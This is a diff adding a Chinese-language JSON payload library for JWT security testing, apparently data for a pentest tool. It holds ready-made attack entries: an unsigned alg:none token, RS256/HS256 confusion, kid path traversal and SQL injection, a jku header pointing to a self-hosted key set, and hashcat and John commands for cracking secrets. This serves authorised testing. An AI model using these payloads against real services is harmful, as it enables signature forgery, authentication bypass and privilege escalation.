@@ -1,0 +1,140 @@
+{
+  "kind": "payload",
+  "version": 1,
+  "group": "JWT 安全测试",
+  "categories": ["算法混淆", "密钥爆破", "头部注入", "命令与工具", "检测思路"],
+  "items": [
+    {
+      "id": "jwt-none-attack",
+      "title": "none 算法绕过",
+      "category": "算法混淆",
+      "code": "把 header 的 alg 改为 none，并删除签名部分：eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
+      "desc": "部分实现未校验 alg 字段，可将算法置空绕过签名验证。",
+      "tags": ["jwt", "none", "bypass"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP JWT Cheat Sheet"
+    },
+    {
+      "id": "jwt-none-variants",
+      "title": "none 大小写变体",
+      "category": "算法混淆",
+      "code": "None / NONE / nOnE",
+      "desc": "不同库对 alg 大小写处理不一致，逐个尝试可提高命中率。",
+      "tags": ["jwt", "none", "bypass"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP JWT Cheat Sheet"
+    },
+    {
+      "id": "jwt-rs256-to-hs256",
+      "title": "RS256 转 HS256 混淆",
+      "category": "算法混淆",
+      "code": "使用公钥作为 HMAC 密钥重新签名：python3 jwt_tool.py <token> -X k -pk public.pem",
+      "desc": "当服务端不校验 alg 时，可用公开的 RSA 公钥作为 HS256 密钥伪造签名。",
+      "tags": ["jwt", "algorithm-confusion", "rs256"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP JWT Cheat Sheet"
+    },
+    {
+      "id": "jwt-kid-path-traversal",
+      "title": "kid 路径穿越",
+      "category": "头部注入",
+      "code": "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"../../../../dev/null\"}",
+      "desc": "kid 用于指定密钥文件，若可控可指向空文件，再用空字符串签名。",
+      "tags": ["jwt", "kid", "traversal"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP JWT Cheat Sheet"
+    },
+    {
+      "id": "jwt-kid-sqli",
+      "title": "kid SQL 注入",
+      "category": "头部注入",
+      "code": "{\"alg\":\"HS256\",\"kid\":\"key1' UNION SELECT 'knownsecret' -- \"}",
+      "desc": "kid 被拼接到 SQL 查询时，可注入已知密钥完成签名伪造。",
+      "tags": ["jwt", "kid", "sqli"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP JWT Cheat Sheet"
+    },
+    {
+      "id": "jwt-jku-inject",
+      "title": "jku / x5u 指向自有 JWKS",
+      "category": "头部注入",
+      "code": "{\"alg\":\"RS256\",\"jku\":\"https://{{domain}}/jwks.json\"}",
+      "desc": "若服务端信任 jku 地址，可托管自有公钥并伪造签名。",
+      "tags": ["jwt", "jku", "x5u"],
+      "vars": ["domain"],
+      "risk": "attack",
+      "source": "OWASP JWT Cheat Sheet"
+    },
+    {
+      "id": "jwt-weak-secret-crack",
+      "title": "弱密钥爆破",
+      "category": "密钥爆破",
+      "code": "hashcat -m 16500 jwt.txt wordlist.txt",
+      "desc": "HS256 密钥强度不足时，可用字典离线爆破。",
+      "tags": ["jwt", "bruteforce", "hashcat"],
+      "vars": [],
+      "risk": "attack",
+      "source": "Hashcat 官方文档"
+    },
+    {
+      "id": "jwt-johntheripper",
+      "title": "John 爆破 JWT",
+      "category": "密钥爆破",
+      "code": "john --format=HMAC-SHA256 jwt.txt",
+      "desc": "另一种离线爆破方式，可与 hashcat 互为备份。",
+      "tags": ["jwt", "bruteforce", "john"],
+      "vars": [],
+      "risk": "attack",
+      "source": "John the Ripper 官方文档"
+    },
+    {
+      "id": "jwt-decode",
+      "title": "本地解码查看",
+      "category": "命令与工具",
+      "code": "python3 -c \"import jwt,sys;print(jwt.decode(sys.argv[1],options={'verify_signature':False}))\" <token>",
+      "desc": "不校验签名直接解码，查看 header 与 payload 结构。",
+      "tags": ["jwt", "decode", "python"],
+      "vars": [],
+      "risk": "low",
+      "source": "PyJWT 官方文档"
+    },
+    {
+      "id": "jwt-tool",
+      "title": "jwt_tool 常用命令",
+      "category": "命令与工具",
+      "code": "python3 jwt_tool.py <token> -M at",
+      "desc": "自动跑一遍常见 JWT 攻击向量，适合快速排查。",
+      "tags": ["jwt", "tool", "automation"],
+      "vars": [],
+      "risk": "attack",
+      "source": "jwt_tool 官方仓库"
+    },
+    {
+      "id": "jwt-exp-check",
+      "title": "过期时间校验缺失",
+      "category": "检测思路",
+      "code": "修改 payload 中 exp 为极大值，观察服务端是否仍接受",
+      "desc": "检验服务端是否真正校验 exp、nbf、iat 等时间声明。",
+      "tags": ["jwt", "exp", "logic"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP JWT Cheat Sheet"
+    },
+    {
+      "id": "jwt-claim-tamper",
+      "title": "权限声明篡改",
+      "category": "检测思路",
+      "code": "修改 payload 中 role / isAdmin / sub 等字段后重放",
+      "desc": "验证服务端是否仅依赖 JWT 声明做权限判断。",
+      "tags": ["jwt", "privilege", "logic"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP WSTG"
+    }
+  ]
+}
